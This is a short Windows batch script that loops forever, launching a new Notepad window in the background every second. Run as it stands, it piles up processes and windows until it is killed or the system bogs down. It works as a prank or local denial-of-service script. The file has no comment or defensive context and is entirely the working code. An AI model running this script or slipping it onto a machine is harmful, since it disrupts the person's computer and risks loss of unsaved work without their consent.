@echo off
:loop
start /b "" notepad.exe
timeout /t 1 >nul
goto loop
